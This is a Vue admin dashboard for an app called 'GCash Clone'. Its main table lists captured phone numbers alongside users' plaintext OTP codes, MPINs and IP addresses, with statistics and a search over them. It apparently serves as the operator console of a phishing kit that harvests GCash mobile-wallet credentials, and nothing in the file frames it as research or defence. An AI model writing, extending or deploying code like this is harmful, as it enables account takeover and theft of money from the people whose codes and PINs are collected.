<script setup>
import { ref, onMounted, computed } from 'vue'

// SweetAlert2 is loaded globally via CDN

const API_BASE_URL = (import.meta.env.VITE_API_URL ?? 'https://gcash-clone-v0-1.onrender.com').replace(/\/$/, '')
const username = ref('')
const password = ref('')
const adminToken = ref('')
const adminData = ref(null)

const registrations = ref([])
const stats = ref(null)
const loading = ref(false)
const error = ref(null)
const currentPage = ref(1)
const totalPages = ref(1)
const showLogin = ref(true)
const searchQuery = ref('')
const showChangePassword = ref(false)

// Password change form
const currentPassword = ref('')
const newPassword = ref('')
const confirmPassword = ref('')
const passwordChangeError = ref('')
const passwordChangeSuccess = ref('')

// Theme toggle
const isDarkMode = ref(false)

// Initialize theme on component mount
const initializeTheme = () => {
  const savedTheme = localStorage.getItem('admin_theme')
  isDarkMode.value = savedTheme === 'dark'
  applyTheme()
}

const toggleTheme = () => {
  isDarkMode.value = !isDarkMode.value
  localStorage.setItem('admin_theme', isDarkMode.value ? 'dark' : 'light')
  applyTheme()
}

const applyTheme = () => {
  if (isDarkMode.value) {
    document.documentElement.classList.add('dark-theme')
  } else {
    document.documentElement.classList.remove('dark-theme')
  }
}

const filteredRegistrations = computed(() => {
  if (!searchQuery.value) return registrations.value
  
  const query = searchQuery.value.toLowerCase()
  return registrations.value.filter(reg => 
    reg.phoneNumber.toLowerCase().includes(query) ||
    reg.phone.toLowerCase().includes(query) ||
    (reg.otp && reg.otp.includes(query)) ||
    (reg.mpin && reg.mpin.includes(query))
  )
})

// Admin login function
const login = async () => {
  if (!username.value || !password.value) {
    error.value = 'Please enter username and password'
    return
  }

  loading.value = true
  error.value = null

  try {
    const response = await fetch(`${API_BASE_URL}/api/admin/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        username: username.value,
        password: password.value
      })
    })

    const data = await response.json()

    if (!response.ok) {
      throw new Error(data.message || 'Login failed')
    }

    adminToken.value = data.token
    adminData.value = data.admin
    localStorage.setItem('admin_token', data.token)
    localStorage.setItem('admin_data', JSON.stringify(data.admin))
    showLogin.value = false
    
    await fetchRegistrations()
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

const fetchRegistrations = async () => {
  if (!adminToken.value) {
    error.value = 'Not authenticated'
    return
  }

  loading.value = true
  error.value = null

  try {
    const response = await fetch(
      `${API_BASE_URL}/api/admin/registrations?page=${currentPage.value}&limit=50`,
      {
        headers: {
          'Authorization': `Bearer ${adminToken.value}`
        }
      }
    )

    const data = await response.json()

    if (!response.ok) {
      if (response.status === 401) {
        logout()
        return
      }
      throw new Error(data.message || 'Failed to fetch data')
    }

    registrations.value = data.registrations
    stats.value = data.stats
    totalPages.value = data.pagination.pages
  } catch (err) {
    error.value = err.message
    registrations.value = []
  } finally {
    loading.value = false
  }
}

// Change password function
const changePassword = async () => {
  if (!currentPassword.value || !newPassword.value || !confirmPassword.value) {
    passwordChangeError.value = 'All password fields are required'
    return
  }

  if (newPassword.value !== confirmPassword.value) {
    passwordChangeError.value = 'New passwords do not match'
    return
  }

  if (newPassword.value.length < 6) {
    passwordChangeError.value = 'New password must be at least 6 characters'
    return
  }

  try {
    const response = await fetch(`${API_BASE_URL}/api/admin/change-password`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${adminToken.value}`
      },
      body: JSON.stringify({
        currentPassword: currentPassword.value,
        newPassword: newPassword.value,
        confirmPassword: confirmPassword.value
      })
    })

    const data = await response.json()

    if (!response.ok) {
      throw new Error(data.message || 'Failed to change password')
    }

    passwordChangeSuccess.value = 'Password changed successfully!'
    passwordChangeError.value = ''
    currentPassword.value = ''
    newPassword.value = ''
    confirmPassword.value = ''
    
    setTimeout(() => {
      showChangePassword.value = false
      passwordChangeSuccess.value = ''
    }, 2000)

  } catch (err) {
    passwordChangeError.value = err.message
    passwordChangeSuccess.value = ''
  }
}

const formatDate = (date) => {
  if (!date) return 'N/A'
  return new Date(date).toLocaleString()
}

const getStatusColor = (status) => {
  const colors = {
    phone_registered: '#fbbf24',
    otp_verified: '#60a5fa',
    mpin_set: '#34d399',
    completed: '#10b981'
  }
  return colors[status] || '#6b7280'
}

const refreshData = () => {
  currentPage.value = 1
  fetchRegistrations()
}

const nextPage = () => {
  if (currentPage.value < totalPages.value) {
    currentPage.value++
    fetchRegistrations()
  }
}

const prevPage = () => {
  if (currentPage.value > 1) {
    currentPage.value--
    fetchRegistrations()
  }
}

const deleteRegistration = async (id) => {
  const result = await Swal.fire({
    title: 'Delete Registration?',
    text: 'This action cannot be undone!',
    icon: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#ef4444',
    cancelButtonColor: '#6b7280',
    confirmButtonText: 'Yes, delete it!',
    cancelButtonText: 'Cancel',
    background: isDarkMode.value ? '#1e293b' : '#ffffff',
    color: isDarkMode.value ? '#f1f5f9' : '#1f2937',
    customClass: {
      confirmButton: 'swal2-confirm-custom',
      cancelButton: 'swal2-cancel-custom'
    }
  })

  if (!result.isConfirmed) return

  try {
    const response = await fetch(`${API_BASE_URL}/api/admin/registrations/${id}`, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bearer ${adminToken.value}`
      }
    })

    if (!response.ok) throw new Error('Failed to delete')

    await fetchRegistrations()
    
    Swal.fire({
      title: 'Deleted!',
      text: 'Registration has been deleted successfully.',
      icon: 'success',
      timer: 2000,
      showConfirmButton: false,
      background: isDarkMode.value ? '#1e293b' : '#ffffff',
      color: isDarkMode.value ? '#f1f5f9' : '#1f2937'
    })
    
  } catch (err) {
    Swal.fire({
      title: 'Error!',
      text: `Failed to delete: ${err.message}`,
      icon: 'error',
      confirmButtonColor: '#ef4444',
      background: isDarkMode.value ? '#1e293b' : '#ffffff',
      color: isDarkMode.value ? '#f1f5f9' : '#1f2937'
    })
  }
}

onMounted(() => {
  // Initialize theme first
  initializeTheme()
  
  // Load admin session
  const savedToken = localStorage.getItem('admin_token')
  const savedAdminData = localStorage.getItem('admin_data')
  
  if (savedToken && savedAdminData) {
    adminToken.value = savedToken
    adminData.value = JSON.parse(savedAdminData)
    showLogin.value = false
    fetchRegistrations()
  }
})

const logout = () => {
  localStorage.removeItem('admin_token')
  localStorage.removeItem('admin_data')
  adminToken.value = ''
  adminData.value = null
  username.value = ''
  password.value = ''
  showLogin.value = true
  registrations.value = []
  stats.value = null
  showChangePassword.value = false
}
</script>

<template>
  <div class="admin-dashboard">
    <!-- Admin Login -->
    <div v-if="showLogin" class="login-card">
      <h1 class="login-title">🔐 GCash Clone Dashboard</h1>
      <p class="login-subtitle">Administrative Control Panel</p>
      
      <div class="login-form">
        <input
          v-model="username"
          type="text"
          placeholder="Username or Email"
          class="login-input"
          @keyup.enter="login"
        />
        <input
          v-model="password"
          type="password"
          placeholder="Password"
          class="login-input"
          minlength="6"
          @keyup.enter="login"
        />
        <button @click="login" class="login-btn" :disabled="loading">
          {{ loading ? 'Logging in...' : 'Login' }}
        </button>
      </div>

      <p v-if="error" class="error-message">{{ error }}</p>
    </div>

    <!-- Dashboard Content -->
    <div v-else class="dashboard-content">
      <!-- Header -->
      <header class="dashboard-header">
        <div class="header-left">
          <h1 class="dashboard-title">📊 GCash Clone Dashboard</h1>
          <p class="dashboard-subtitle">Registration Tracking & Management</p>
          <div class="admin-info" v-if="adminData">
            <span class="admin-welcome">Welcome, <strong>{{ adminData.username }}</strong></span>
            <span class="admin-role">{{ adminData.role }}</span>
          </div>
        </div>
        <div class="header-right">
          <button @click="toggleTheme" class="theme-toggle-btn" :title="isDarkMode ? 'Switch to Light Mode' : 'Switch to Dark Mode'">
            <i :class="isDarkMode ? 'fas fa-sun' : 'fas fa-moon'"></i>
            <span class="theme-btn-text">{{ isDarkMode ? 'Light' : 'Dark' }}</span>
          </button>
          <button @click="refreshData" class="refresh-btn" :disabled="loading">
            <i class="fas fa-sync-alt"></i> Refresh
          </button>
          <button @click="showChangePassword = true" class="change-password-btn">
            <i class="fas fa-key"></i> Change Password
          </button>
          <button @click="logout" class="logout-btn">Logout</button>
        </div>
      </header>

      <!-- Stats -->
      <div v-if="stats" class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">{{ stats.total }}</div>
          <div class="stat-label">Total Registrations</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.withOTP }}</div>
          <div class="stat-label">With OTP</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.withMPIN }}</div>
          <div class="stat-label">With MPIN</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.today }}</div>
          <div class="stat-label">Today</div>
        </div>
      </div>

      <!-- Search -->
      <div class="search-bar">
        <input
          v-model="searchQuery"
          type="text"
          placeholder="🔍 Search by phone, OTP, or MPIN..."
          class="search-input"
        />
        <span class="result-count">{{ filteredRegistrations.length }} results</span>
      </div>

      <!-- Loading -->
      <div v-if="loading" class="loading-state">
        <div class="spinner"></div>
        <p>Loading registrations...</p>
      </div>

      <!-- Error -->
      <div v-else-if="error" class="error-state">
        <p>❌ {{ error }}</p>
        <button @click="fetchRegistrations" class="retry-btn">Retry</button>
      </div>

      <!-- Table -->
      <div v-else class="table-container">
        <table class="data-table">
          <thead>
            <tr>
              <th>Phone Number</th>
              <th>OTP Code</th>
              <th>MPIN</th>
              <th>Status</th>
              <th>IP Address</th>
              <th>Created At</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="reg in filteredRegistrations" :key="reg.id">
              <td class="phone-cell">
                <strong>{{ reg.phoneNumber }}</strong>
              </td>
              <td class="code-cell">
                <span v-if="reg.otp && reg.otp !== 'Not set' && reg.otp !== null && reg.otp !== ''" 
                      class="code-badge otp"
                      :class="{ 'verified': reg.otpVerifiedAt }"
                      :title="reg.otpVerifiedAt ? `Verified at ${formatDate(reg.otpVerifiedAt)}` : 'Not verified yet'">
                  {{ reg.otp }}
                  <i v-if="reg.otpVerifiedAt" class="fas fa-check-circle verified-icon"></i>
                </span>
                <span v-else class="not-set" :title="`OTP value: '${reg.otp}'`">—</span>
              </td>
              <td class="code-cell">
                <span v-if="reg.mpin !== 'Not set'" class="code-badge mpin">{{ reg.mpin }}</span>
                <span v-else class="not-set">—</span>
              </td>
              <td>
                <span class="status-badge" :style="{ backgroundColor: getStatusColor(reg.status) }">
                  {{ reg.status }}
                </span>
              </td>
              <td class="ip-cell">{{ reg.ipAddress || 'N/A' }}</td>
              <td class="date-cell">{{ formatDate(reg.createdAt) }}</td>
              <td>
                <button @click="deleteRegistration(reg.id)" class="delete-btn" title="Delete Registration">
                  <i class="fas fa-trash-alt"></i>
                </button>
              </td>
            </tr>
          </tbody>
        </table>

        <div v-if="filteredRegistrations.length === 0" class="empty-state">
          <p>No registrations found</p>
        </div>
      </div>

      <!-- Pagination -->
      <div v-if="!loading && totalPages > 1" class="pagination">
        <button @click="prevPage" :disabled="currentPage === 1" class="page-btn">
          ← Previous
        </button>
        <span class="page-info">Page {{ currentPage }} of {{ totalPages }}</span>
        <button @click="nextPage" :disabled="currentPage === totalPages" class="page-btn">
          Next →
        </button>
      </div>
    </div>

    <!-- Change Password Modal -->
    <div v-if="showChangePassword" class="modal-overlay" @click="showChangePassword = false">
      <div class="modal-card" @click.stop>
        <h2 class="modal-title">🔑 Change Password</h2>
        
        <div class="password-form">
          <input
            v-model="currentPassword"
            type="password"
            placeholder="Current Password"
            class="password-input"
            minlength="6"
          />
          <input
            v-model="newPassword"
            type="password"
            placeholder="New Password (min 6 chars)"
            class="password-input"
            minlength="6"
          />
          <input
            v-model="confirmPassword"
            type="password"
            placeholder="Confirm New Password"
            class="password-input"
            minlength="6"
          />
        </div>

        <p v-if="passwordChangeError" class="error-message">{{ passwordChangeError }}</p>
        <p v-if="passwordChangeSuccess" class="success-message">{{ passwordChangeSuccess }}</p>

        <div class="modal-actions">
          <button @click="showChangePassword = false" class="cancel-btn">Cancel</button>
          <button @click="changePassword" class="update-btn">Update Password</button>
        </div>
      </div>
    </div>
  </div>
</template>

<style>
/* Global theme variables (unscoped) */
:root {
  --bg-gradient: linear-gradient(135deg, #1C72F9 0%, #0b3a8f 100%);
  --bg-card: #ffffff;
  --text-primary: #1f2937;
  --text-secondary: #6b7280;
  --text-muted: #9ca3af;
  --border-color: #e5e7eb;
  --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  --shadow-lg: 0 20px 60px rgba(0, 0, 0, 0.3);
  --primary-color: #1C72F9;
  --primary-hover: #0b3a8f;
  --success-color: #10b981;
  --success-hover: #059669;
  --error-color: #ef4444;
  --error-hover: #dc2626;
}

.dark-theme {
  --bg-gradient: linear-gradient(135deg, #0f2560 0%, #1a1a1a 100%);
  --bg-card: #1e293b;
  --text-primary: #f1f5f9;
  --text-secondary: #cbd5e1;
  --text-muted: #64748b;
  --border-color: #334155;
  --shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
  --shadow-lg: 0 20px 60px rgba(0, 0, 0, 0.5);
  --primary-color: #6ea7ff;
  --primary-hover: #9cc8ff;
}
</style>

<style scoped>

.admin-dashboard {
  min-height: 100vh;
  background: var(--bg-gradient);
  padding: 1rem;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  transition: all 0.3s ease;
}

@media (min-width: 768px) {
  .admin-dashboard {
    padding: 2rem;
  }
}

/* Login Card */
.login-card {
  max-width: 420px;
  width: 100%;
  margin: 8vh auto;
  background: var(--bg-card);
  border-radius: 20px;
  padding: 2rem;
  box-shadow: var(--shadow-lg);
  transition: all 0.3s ease;
  border: 1px solid var(--border-color);
}

@media (min-width: 768px) {
  .login-card {
    margin: 10vh auto;
    padding: 2.5rem;
  }
}

.login-title {
  margin: 0 0 0.75rem;
  font-size: 1.75rem;
  font-weight: 700;
  color: var(--text-primary);
  text-align: center;
  letter-spacing: -0.025em;
}

@media (min-width: 768px) {
  .login-title {
    font-size: 2rem;
  }
}

.login-subtitle {
  margin: 0 0 2.5rem;
  color: var(--text-secondary);
  text-align: center;
  font-size: 0.95rem;
  font-weight: 500;
}

@media (min-width: 768px) {
  .login-subtitle {
    font-size: 1rem;
  }
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 1.25rem;
}

.login-input {
  padding: 1rem 1.25rem;
  border: 2px solid var(--border-color);
  border-radius: 12px;
  font-size: 1rem;
  outline: none;
  background: var(--bg-card);
  color: var(--text-primary);
  transition: all 0.2s ease;
  font-weight: 500;
}

.login-input:focus {
  border-color: var(--primary-color);
  box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
  transform: translateY(-1px);
}

.login-input::placeholder {
  color: var(--text-muted);
  font-weight: 400;
}

.login-btn {
  padding: 1rem 1.25rem;
  background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-hover) 100%);
  color: white;
  border: none;
  border-radius: 12px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  margin-top: 0.5rem;
}

.login-btn:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
  background: linear-gradient(135deg, var(--primary-hover) 0%, var(--primary-color) 100%);
}

.login-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
  transform: none;
}

/* Dashboard Content */
.dashboard-content {
  max-width: 1400px;
  margin: 0 auto;
}

.dashboard-header {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  margin-bottom: 1.5rem;
  background: var(--bg-card);
  padding: 1rem;
  border-radius: 12px;
  box-shadow: var(--shadow);
  transition: all 0.3s ease;
}

@media (min-width: 768px) {
  .dashboard-header {
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 2rem;
    padding: 1.5rem 2rem;
    gap: 2rem;
  }
}

.header-left {
  flex: 1;
}

.dashboard-title {
  margin: 0 0 0.25rem;
  font-size: 1.5rem;
  color: var(--text-primary);
}

@media (min-width: 768px) {
  .dashboard-title {
    font-size: 1.75rem;
  }
}

.dashboard-subtitle {
  margin: 0;
  color: var(--text-secondary);
  font-size: 0.9rem;
}

@media (min-width: 768px) {
  .dashboard-subtitle {
    font-size: 0.95rem;
  }
}

.admin-info {
  margin-top: 0.5rem;
  display: flex;
  flex-wrap: wrap;
  gap: 0.75rem;
  align-items: center;
}

.admin-welcome {
  color: var(--text-primary);
  font-size: 0.85rem;
}

@media (min-width: 768px) {
  .admin-welcome {
    font-size: 0.9rem;
  }
}

.admin-role {
  background: var(--primary-color);
  color: white;
  padding: 0.25rem 0.75rem;
  border-radius: 999px;
  font-size: 0.7rem;
  font-weight: 500;
  text-transform: uppercase;
}

@media (min-width: 768px) {
  .admin-role {
    font-size: 0.75rem;
  }
}

.header-right {
  display: flex;
  flex-wrap: wrap;
  gap: 0.5rem;
  justify-content: center;
}

@media (min-width: 768px) {
  .header-right {
    gap: 0.75rem;
    justify-content: flex-end;
  }
}

.theme-toggle-btn,
.refresh-btn, 
.logout-btn, 
.change-password-btn {
  padding: 0.5rem 1rem;
  border: none !important;
  outline: none !important;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
  transition: all 0.3s ease;
  box-shadow: none;
  font-size: 0.875rem;
}

.theme-toggle-btn:focus,
.refresh-btn:focus, 
.logout-btn:focus, 
.change-password-btn:focus {
  outline: none !important;
  border: none !important;
  box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.3);
}

@media (min-width: 768px) {
  .theme-toggle-btn,
  .refresh-btn, 
  .logout-btn, 
  .change-password-btn {
    padding: 0.625rem 1.25rem;
    font-size: 0.9rem;
  }
}

.theme-toggle-btn {
  background: white;
  color: black;
  padding: 0.625rem 1rem;
  border-radius: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 2px solid var(--border-color);
  transition: all 0.3s ease;
  min-width: auto;
  font-weight: 600;
  gap: 0.5rem;
}

.theme-toggle-btn i {
  font-size: 1rem;
  transition: all 0.3s ease;
}

.dark-theme .theme-toggle-btn {
  background: black;
  color: white;
  border-color: #4a5568;
}

.theme-toggle-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
}

.dark-theme .theme-toggle-btn:hover {
  box-shadow: 0 4px 15px rgba(255, 255, 255, 0.15);
}

.theme-btn-text {
  display: none;
  font-size: 0.875rem;
}

@media (min-width: 768px) {
  .theme-toggle-btn {
    padding: 0.625rem 1.25rem;
  }
  
  .theme-btn-text {
    display: inline;
  }
}

.refresh-btn {
  background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
  color: white;
  border-radius: 10px;
  border: none;
  outline: none;
}

.refresh-btn i {
  margin-right: 0.5rem;
  font-size: 0.9rem;
}

.refresh-btn:hover:not(:disabled) {
  background: linear-gradient(135deg, var(--primary-hover), var(--primary-color));
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
}

.refresh-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
  transform: none;
}

.change-password-btn {
  background: linear-gradient(135deg, var(--success-color), var(--success-hover));
  color: white;
  border-radius: 10px;
  border: none;
  outline: none;
}

.change-password-btn i {
  margin-right: 0.5rem;
  font-size: 0.9rem;
}

.change-password-btn:hover {
  background: linear-gradient(135deg, var(--success-hover), var(--success-color));
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
}

.logout-btn {
  background: linear-gradient(135deg, var(--error-color), var(--error-hover));
  color: white;
  border-radius: 10px;
}

.logout-btn:hover {
  background: linear-gradient(135deg, var(--error-hover), var(--error-color));
  transform: translateY(-2px);
  box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
}

/* Stats Grid */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 1rem;
  margin-bottom: 1.5rem;
}

@media (min-width: 768px) {
  .stats-grid {
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    margin-bottom: 2rem;
  }
}

.stat-card {
  background: var(--bg-card);
  padding: 1.5rem;
  border-radius: 16px;
  box-shadow: var(--shadow);
  text-align: center;
  transition: all 0.3s ease;
  border: 1px solid var(--border-color);
  position: relative;
  overflow: hidden;
}

@media (min-width: 768px) {
  .stat-card {
    padding: 2rem;
  }
}

.stat-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 4px;
  background: linear-gradient(90deg, var(--primary-color), var(--success-color));
}

.stat-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
  border-color: var(--primary-color);
}

.stat-value {
  font-size: 2rem;
  font-weight: 700;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
}

@media (min-width: 768px) {
  .stat-value {
    font-size: 2.5rem;
  }
}

.stat-label {
  color: var(--text-secondary);
  font-size: 0.85rem;
  font-weight: 500;
}

@media (min-width: 768px) {
  .stat-label {
    font-size: 0.95rem;
  }
}

/* Search Bar */
.search-bar {
  background: var(--bg-card);
  padding: 1rem;
  border-radius: 12px;
  margin-bottom: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
  box-shadow: var(--shadow);
  transition: all 0.3s ease;
}

@media (min-width: 768px) {
  .search-bar {
    flex-direction: row;
    align-items: center;
    padding: 1.25rem;
    gap: 1rem;
  }
}

.search-input {
  flex: 1;
  padding: 0.75rem 1rem;
  border: 2px solid var(--border-color);
  border-radius: 8px;
  font-size: 1rem;
  outline: none;
  background: var(--bg-card);
  color: var(--text-primary);
  transition: all 0.2s ease;
}

.search-input:focus {
  border-color: var(--primary-color);
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

.result-count {
  color: var(--text-secondary);
  font-size: 0.85rem;
  font-weight: 500;
  text-align: center;
}

@media (min-width: 768px) {
  .result-count {
    font-size: 0.9rem;
    text-align: right;
  }
}

/* Table */
.table-container {
  background: var(--bg-card);
  border-radius: 16px;
  box-shadow: var(--shadow);
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  border: 1px solid var(--border-color);
}

.data-table {
  width: 100%;
  min-width: 800px;
  border-collapse: collapse;
}

@media (min-width: 1024px) {
  .data-table {
    min-width: auto;
  }
}

.data-table thead {
  background: var(--border-color);
}

.dark-theme .data-table thead {
  background: rgba(51, 65, 85, 0.5);
}

.data-table th {
  padding: 0.75rem;
  text-align: left;
  font-weight: 600;
  color: var(--text-primary);
  font-size: 0.8rem;
  text-transform: uppercase;
  letter-spacing: 0.05em;
  white-space: nowrap;
}

@media (min-width: 768px) {
  .data-table th {
    padding: 1rem;
    font-size: 0.875rem;
  }
}

.data-table tbody tr {
  border-top: 1px solid var(--border-color);
  transition: background-color 0.2s;
}

.data-table tbody tr:hover {
  background: var(--border-color);
}

.dark-theme .data-table tbody tr:hover {
  background: rgba(51, 65, 85, 0.3);
}

.data-table td {
  padding: 0.75rem;
  color: var(--text-primary);
  font-size: 0.875rem;
  word-break: break-word;
}

@media (min-width: 768px) {
  .data-table td {
    padding: 1rem;
    font-size: 0.9rem;
  }
}

.phone-cell strong {
  color: var(--text-primary);
  font-weight: 600;
}

.code-cell {
  font-family: 'Courier New', monospace;
  font-weight: 600;
}

.code-badge {
  display: inline-block;
  padding: 0.25rem 0.5rem;
  border-radius: 6px;
  font-size: 0.8rem;
  letter-spacing: 0.1em;
}

@media (min-width: 768px) {
  .code-badge {
    padding: 0.375rem 0.75rem;
    font-size: 0.95rem;
  }
}

.code-badge.otp {
  background: #dbeafe;
  color: #1e40af;
}

.dark-theme .code-badge.otp {
  background: rgba(30, 64, 175, 0.2);
  color: #93c5fd;
}

.code-badge.mpin {
  background: #d1fae5;
  color: #065f46;
}

.dark-theme .code-badge.mpin {
  background: rgba(6, 95, 70, 0.2);
  color: #6ee7b7;
}

.code-badge.verified {
  position: relative;
  padding-right: 2rem;
}

.verified-icon {
  position: absolute;
  right: 0.5rem;
  top: 50%;
  transform: translateY(-50%);
  color: #10b981;
  font-size: 0.8rem;
}

.dark-theme .verified-icon {
  color: #6ee7b7;
}

/* Custom SweetAlert2 Button Styling */
.swal2-confirm-custom:focus {
  outline: 2px solid rgba(239, 68, 68, 0.5) !important;
  outline-offset: 2px !important;
  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2) !important;
}

.swal2-cancel-custom:focus {
  outline: 2px solid rgba(107, 114, 128, 0.5) !important;
  outline-offset: 2px !important;
  box-shadow: 0 0 0 3px rgba(107, 114, 128, 0.2) !important;
}

/* Alternative: If you really want to remove outline (NOT RECOMMENDED for accessibility) */
/*
.swal2-confirm-custom:focus,
.swal2-cancel-custom:focus {
  outline: none !important;
  box-shadow: none !important;
}
*/

.not-set {
  color: var(--text-muted);
}

.status-badge {
  display: inline-block;
  padding: 0.375rem 0.875rem;
  border-radius: 999px;
  font-size: 0.8rem;
  font-weight: 600;
  color: white;
  text-transform: capitalize;
}

.ip-cell, .date-cell {
  color: #6b7280;
  font-size: 0.9rem;
}

.delete-btn {
  background: transparent;
  border: none;
  cursor: pointer;
  transition: all 0.2s ease;
  padding: 0.5rem;
  border-radius: 6px;
  color: var(--text-muted);
}

.delete-btn i {
  font-size: 1rem;
  transition: all 0.2s ease;
}

.delete-btn:hover {
  background: rgba(239, 68, 68, 0.1);
  color: var(--error-color);
  transform: scale(1.1);
}

.delete-btn:hover i {
  transform: rotate(10deg);
}

/* States */
.loading-state, .error-state, .empty-state {
  text-align: center;
  padding: 3rem;
  background: white;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #e5e7eb;
  border-top-color: #667eea;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 0 auto 1rem;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.error-message {
  color: #ef4444;
  margin-top: 1rem;
  font-size: 0.9rem;
}

.retry-btn {
  margin-top: 1rem;
  padding: 0.625rem 1.5rem;
  background: #667eea;
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
}

/* Pagination */
.pagination {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 1rem;
  margin-top: 2rem;
  padding: 1rem;
  background: white;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.page-btn {
  padding: 0.625rem 1.25rem;
  background: #667eea;
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
}

.page-btn:disabled {
  background: #e5e7eb;
  color: #9ca3af;
  cursor: not-allowed;
}

.page-info {
  color: #6b7280;
  font-weight: 500;
}

/* Change Password Modal */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  padding: 1rem;
}

@media (min-width: 768px) {
  .modal-overlay {
    padding: 2rem;
  }
}

.modal-card {
  background: var(--bg-card);
  border-radius: 16px;
  padding: 1.5rem;
  max-width: 400px;
  width: 100%;
  box-shadow: var(--shadow-lg);
  max-height: 90vh;
  overflow-y: auto;
}

@media (min-width: 768px) {
  .modal-card {
    padding: 2.5rem;
  }
}

.modal-title {
  margin: 0 0 1.5rem;
  font-size: 1.25rem;
  color: var(--text-primary);
  text-align: center;
}

@media (min-width: 768px) {
  .modal-title {
    font-size: 1.5rem;
  }
}

.password-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  margin-bottom: 1.5rem;
}

.password-input {
  padding: 0.875rem 1rem;
  border: 2px solid var(--border-color);
  border-radius: 8px;
  font-size: 1rem;
  outline: none;
  background: var(--bg-card);
  color: var(--text-primary);
  transition: all 0.2s ease;
}

.password-input:focus {
  border-color: var(--primary-color);
  box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
}

.error-message {
  color: var(--error-color);
  font-weight: 500;
  text-align: center;
  margin: 0.5rem 0;
  font-size: 0.9rem;
}

.modal-actions {
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
}

@media (min-width: 480px) {
  .modal-actions {
    flex-direction: row;
    justify-content: flex-end;
    gap: 1rem;
  }
}

.cancel-btn {
  padding: 0.625rem 1.25rem;
  background: var(--text-muted);
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.cancel-btn:hover {
  background: var(--text-secondary);
}

.update-btn {
  padding: 0.625rem 1.25rem;
  background: var(--success-color);
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
}

.update-btn:hover {
  background: var(--success-hover);
}

.success-message {
  color: var(--success-color);
  font-weight: 500;
  text-align: center;
  margin: 0.5rem 0;
  font-size: 0.9rem;
}
</style>
